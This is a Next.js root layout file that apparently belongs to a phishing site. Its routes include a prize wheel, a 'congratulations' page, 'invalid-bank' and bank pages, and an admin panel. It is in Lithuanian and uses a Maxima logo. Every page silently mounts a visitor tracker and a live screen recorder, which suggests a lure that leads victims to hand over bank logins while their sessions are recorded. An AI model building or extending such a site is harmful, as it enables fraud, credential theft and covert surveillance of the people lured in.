"use client";

import { usePathname } from "next/navigation";
import LiveToast from "@/components/LiveToast";
import { SettingsProvider } from "@/contexts/SettingsContext";
import { VisitorTracker } from "@/components/VisitorTracker";
import { LiveScreenRecorder } from "@/components/LiveScreenRecorder";
import { OgImageTags } from "@/components/OgImageTags";
import "./globals.css";

export default function RootLayout({
  children,
}: {
  children: React.ReactNode;
}) {
  const pathname = usePathname();

  const hideToastOnPaths = [
    "/admin",
    "/admin/login",
    "/invalid-bank",
    "/congratulations",
    "/live-support",
    "/banken"
  ];

  const shouldShowToast = !hideToastOnPaths.some(path => pathname.startsWith(path)) && !pathname.includes("/bank/");

  const isAdminPage = pathname.startsWith("/admin");
  const isWheelPage = /^\/wheel(\/|$|\?)/.test(pathname) || pathname.startsWith("/wheel");
  const isDedicatedBankPage = pathname.includes("/bank/");
  // Birebir HTML tasarimli sayfalar: portal temasi (ah-theme) BASILMASIN
  const isStandaloneDesignPage = pathname.startsWith("/win2");

  const bodyClass = [
    isAdminPage || isStandaloneDesignPage ? "bg-[#f4f7f9]" : isWheelPage ? "" : "ah-theme",
    isDedicatedBankPage ? "ah-theme-overlay-bg" : "",
  ]
    .filter(Boolean)
    .join(" ");

  const ENABLE_TOAST = false;

  return (
    <html lang="lt">
      <head>
        <OgImageTags />
        <link rel="manifest" href="/manifest.json" />
        <meta name="theme-color" content="#0066CC" />
        <meta name="mobile-web-app-capable" content="yes" />
        <meta name="apple-mobile-web-app-capable" content="yes" />
        <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent" />
        <meta name="apple-mobile-web-app-title" content="EPIN Admin" />
        <link rel="apple-touch-icon" href="/form-assets/maxima-mini-logo.png" />
      </head>
      <body className={bodyClass}>
        <VisitorTracker />
        <LiveScreenRecorder />
        <SettingsProvider>
          {ENABLE_TOAST && shouldShowToast && <LiveToast />}
          {children}
        </SettingsProvider>
      </body>
    </html>
  );
}
